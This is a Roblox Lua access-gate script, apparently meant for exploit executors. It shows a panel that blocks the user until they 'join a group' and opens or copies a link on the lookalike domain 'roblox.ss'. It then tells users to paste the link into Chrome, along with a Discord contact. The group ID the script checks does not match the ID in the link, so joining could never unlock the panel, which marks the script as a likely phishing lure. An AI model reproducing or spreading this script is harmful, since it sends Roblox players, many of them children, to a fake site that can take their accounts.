wait("0.2")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- CONFIG
local GROUP_ID = 1920432847
local GROUP_LINK = "https://www.roblox.ss/communities/2548962018/Roblox-SCRIPTS"
-- UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AccessUI"
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 380, 0, 270)
Main.Position = UDim2.new(0.5, -190, 0.7, 0)
Main.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
Main.BorderSizePixel = 0
Main.Parent = ScreenGui
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 18)

-- Stroke
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(60,60,70)
Stroke.Transparency = 0.6

-- Accent
local Accent = Instance.new("Frame", Main)
Accent.Size = UDim2.new(1,0,0,5)
Accent.BorderSizePixel = 0
Instance.new("UICorner", Accent).CornerRadius = UDim.new(0,18)

local Grad = Instance.new("UIGradient", Accent)
Grad.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,255,200))
}

-- Title (drag handle)
local Title = Instance.new("TextLabel", Main)
Title.Text = "ACCESS PANEL"
Title.Size = UDim2.new(1,0,0,45)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22

-- Status
local Status = Instance.new("TextLabel", Main)
Status.Text = "Checking access..."
Status.Size = UDim2.new(1,-20,0,25)
Status.Position = UDim2.new(0,10,0,50)
Status.BackgroundTransparency = 1
Status.TextColor3 = Color3.fromRGB(170,170,170)
Status.Font = Enum.Font.Gotham
Status.TextSize = 14

-- Instructions
local Instructions = Instance.new("TextLabel", Main)
Instructions.Text = "1. Press JOIN GROUP\n2. Opens or copies link\n3. If it doesn't open, paste in Chrome\n4. Join the group"
Instructions.Size = UDim2.new(1,-30,0,80)
Instructions.Position = UDim2.new(0,15,0,80)
Instructions.BackgroundTransparency = 1
Instructions.TextColor3 = Color3.fromRGB(200,200,200)
Instructions.Font = Enum.Font.Gotham
Instructions.TextSize = 14
Instructions.TextWrapped = true
Instructions.TextXAlignment = Enum.TextXAlignment.Left

-- Button
local JoinBtn = Instance.new("TextButton", Main)
JoinBtn.Text = "JOIN GROUP"
JoinBtn.Size = UDim2.new(0.65,0,0,42)
JoinBtn.Position = UDim2.new(0.175,0,0,170)
JoinBtn.BackgroundColor3 = Color3.fromRGB(0,160,255)
JoinBtn.TextColor3 = Color3.fromRGB(255,255,255)
JoinBtn.Font = Enum.Font.GothamBold
JoinBtn.TextSize = 15
Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0,14)

local BtnGrad = Instance.new("UIGradient", JoinBtn)
BtnGrad.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,140,255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,200,255))
}

-- Footer
local Footer = Instance.new("TextLabel", Main)
Footer.Text = "Need help? discord.gg/QYUJWVdz7"
Footer.Size = UDim2.new(1,-20,0,20)
Footer.Position = UDim2.new(0,10,1,-25)
Footer.BackgroundTransparency = 1
Footer.TextColor3 = Color3.fromRGB(130,130,130)
Footer.Font = Enum.Font.Gotham
Footer.TextSize = 11

-- STATE
local busy = false
local hasAccess = false

-- Check group
local function checkGroup()
	local inGroup = false
	
	pcall(function()
		inGroup = player:IsInGroup(GROUP_ID)
	end)

	if inGroup then
		hasAccess = true
		Status.Text = "Access Granted âœ…"
		Status.TextColor3 = Color3.fromRGB(0,255,170)
		JoinBtn.Visible = false
	else
		hasAccess = false
		Status.Text = "Join the group to continue âŒ"
		Status.TextColor3 = Color3.fromRGB(255,120,120)
		JoinBtn.Visible = true
	end
end

-- Auto re-check
task.spawn(function()
	while not hasAccess do
		task.wait(5)
		checkGroup()
	end
end)

-- Button click (browser + fallback + instruction)
JoinBtn.MouseButton1Click:Connect(function()
	if busy then return end
	busy = true

	local opened = false

	if typeof(openbrowser) == "function" then
		openbrowser(GROUP_LINK)
		opened = true
	elseif typeof(open_url) == "function" then
		open_url(GROUP_LINK)
		opened = true
	end

	if opened then
		Status.Text = "Opened in browser ðŸŒ (if not, paste in Chrome)"
		Status.TextColor3 = Color3.fromRGB(0,255,170)
	else
		if typeof(setclipboard) == "function" then
			setclipboard(GROUP_LINK)
			Status.Text = "Link copied! Paste it in Chrome ðŸŒ"
			Status.TextColor3 = Color3.fromRGB(0,200,255)
		else
			Status.Text = "Copy link and open in Chrome âš ï¸"
		end
	end

	task.wait(1)
	busy = false
end)

-- Button animations
JoinBtn.MouseEnter:Connect(function()
	TweenService:Create(JoinBtn, TweenInfo.new(0.2), {
		Size = UDim2.new(0.68,0,0,44)
	}):Play()
end)

JoinBtn.MouseLeave:Connect(function()
	TweenService:Create(JoinBtn, TweenInfo.new(0.2), {
		Size = UDim2.new(0.65,0,0,42)
	}):Play()
end)

-- Draggable (TITLE ONLY)
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	Main.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

Title.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 
	or input.UserInputType == Enum.UserInputType.Touch then
		
		dragging = true
		dragStart = input.Position
		startPos = Main.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

Title.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement 
	or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

-- Entrance animation
TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
	Position = UDim2.new(0.5, -190, 0.5, -135)
}):Play()

-- Initial check
checkGroup()